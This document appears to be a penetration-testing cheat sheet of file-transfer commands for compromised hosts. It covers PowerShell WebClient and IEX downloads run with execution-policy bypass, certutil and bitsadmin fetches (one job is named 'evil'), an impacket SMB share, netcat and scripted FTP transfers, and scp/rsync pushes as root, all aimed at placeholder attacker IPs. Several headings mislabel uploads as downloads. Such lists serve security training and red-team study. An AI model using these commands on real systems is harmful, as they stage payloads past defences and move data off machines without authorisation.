USING POWERSHELL -
------------------------------------------------------------------------------------------------------------------


#### 

**Web Content Download**
    
    $webClient.DownloadFile('http://10.10.10.10:80/demo.txt','c:\temp\demo.txt')

**Web Content Download**
    
    powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/demo.txt','c:\temp\demo.txt')

**Web Content Download**
    
    powershell.exe IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10:80/demo.txt','C:\temp\demo.txt')

**Web Content Download**
    
    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10/demo.txt','C:\temp\demo.txt')"

**Web Content Download**
    
    powershell.exe Invoke-RestMethod -Uri "http://10.10.10.10/demo.txt" -OutFile "c:\temp\demo.txt"

**Web Content Download**
    
    powershell.exe Invoke-webRequest -Uri "http://10.10.10.10/demo.txt" -OutFile "c:\temp\demo.txt"

**Powershell Wget**
    
    powershell.exe -c wget "http://10.10.14.17/demo.txt" -outfile "c:\temp\demo.txt"

**Powershell Curl**
    
    powershell.exe -c "curl.exe http://10.10.10.10:80/demo.txt c:\temp\demo.txt"

**Powershell IEX**

    echo IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10:80/demo.txt','C:\temp\demo.txt') | powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile
   
**Powershell Direct URI**
    
    iwr -uri http://192.168.45.240/demo.txt -Outfile demo.txt

**Powershell BitsTransfer**

    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://10.10.10.10/demo.txt' -Destination 'c:\temp\demo.txt'"

**Using file**
    
    echo '$storageDir = $pwd' > wget.ps1
    echo '$webclient = New-Object System.Net.WebClient' >> wget.ps1
    echo '$url = "http://10.10.10.10/demo.txt"' >> wget.ps1
    echo '$file = "c:\temp\demo.txt"' >> wget.ps1
    echo '$webclient.DownloadFile($url, $file)' >> wget.ps1

    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
------------------------------------------------------------------------------------------------------------------
USING CMD - 
------------------------------------------------------------------------------------------------------------------

**Web Content Download**
    
    powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/demo.txt','c:\temp\demo.txt')

**Web Content Download**

    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://10.10.10.10/demo.txt' -Destination 'C:\temp\demo.txt'"

**Web Content Download**
    
    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('http://10.10.10.10:80/demo.txt','c:\temp\demo.txt')"

**Web Content Download**
    
    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10/demo.txt','C:\temp\demo.txt')"

------------------------------------------------------------------------------------------------------------------
USING CERTUTIL - 
------------------------------------------------------------------------------------------------------------------

**Web Content Download**
    
    certutil.exe -urlcache -split -f "http://10.10.10.10/demo.txt" demo.txt

**encode content to base64**

    certutil.exe -encode c:demo.txt out.b64 & more .\out.b64

decode with this command or use online base64 decoder

    echo "base64_value==" | base64 -d > demo.txt

------------------------------------------------------------------------------------------------------------------
USING SMB - 
------------------------------------------------------------------------------------------------------------------

**SMB SERVER -**

**Start normal SMB Server**
    
    impacket-smbserver share .

**If version error**
    
    impacket-smbserver -smb2support share .

**Use authenticated servers if file transfer is long**

    impacket-smbserver share -username user -password 123 . -smb2support


**SMB CLIENT -**

**To create authenticated session**
    
    net use \\10.10.10.10 /u:"user" "123"

**Web Content Download**
    
    copy \\10.10.10.10\share\demo.txt c:\temp\demo.txt  
------------------------------------------------------------------------------------------------------------------
USING SSH - 
------------------------------------------------------------------------------------------------------------------

**SCP-**

**Web Content Download**
    
    scp /tmp/demo.txt user@10.10.10.10:/tmp/

**Web Content Download**

    scp demo.txt root@10.10.10.10:/root/

**RSYNC-**

**Web Content Download**
    
    rsync -av /tmp/centos/ root@192.168.1.120:/root/*

**Web Content Download**

    rsync -av -e 'ssh -i /home/user/id_rsa' root@10.10.10.10:/root/* /tmp/demo/

**Web Content Download**

    rsync -av --port 22 -e 'ssh -i /home/user/id_rsa' root@10.10.10.10:/root/* /tmp/demo/
------------------------------------------------------------------------------------------------------------------
USING WinRM - 
------------------------------------------------------------------------------------------------------------------

**Web Content Download**
    
    download demo.txt
------------------------------------------------------------------------------------------------------------------
USING BITSADMIN - 
------------------------------------------------------------------------------------------------------------------

**Web Content Download**
    
    bitsadmin /transfer n http://10.10.10.10/demo.txt C:\temp\demo.txt

**Web Content Download**
    
    bitsadmin /transfer evil /download /priority high http://10.10.10.10:80/demo.txt c:\temp\demo.txt

**Web Content Download**
    
    powershell.exe -c Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.10/demo.txt" -Destination "C:\temp\demo.txt"
------------------------------------------------------------------------------------------------------------------
USING NC / NETCAT - 
------------------------------------------------------------------------------------------------------------------

**First, start listener on client with output redirection to file**
    
    nc.exe -nlvp 443 > demo.txt

**Then start server with input redirection from file**
    
    nc.exe -v 10.10.10.10 443 < demo.txt
------------------------------------------------------------------------------------------------------------------
USING FTP - 
------------------------------------------------------------------------------------------------------------------

**File Download**

Replace "demo.txt" with desired file name
    
    echo open 10.10.10.10 21 > file.txt
    echo bin>> file.txt
    echo get demo.txt>> file.txt
    echo bye>> file.txt

    ftp -A -v -n -s:file.txt

**One Liner**

    echo open 10.10.10.10 21 > file.txt && echo bin>> file.txt && echo get demo.txt>> file.txt && echo bye>> file.txt && ftp -A -v -n -s:file.txt

**Mannualy -**

    ftp
    open 10.10.10.10 2121
    get demo.txt
------------------------------------------------------------------------------------------------------------------

 
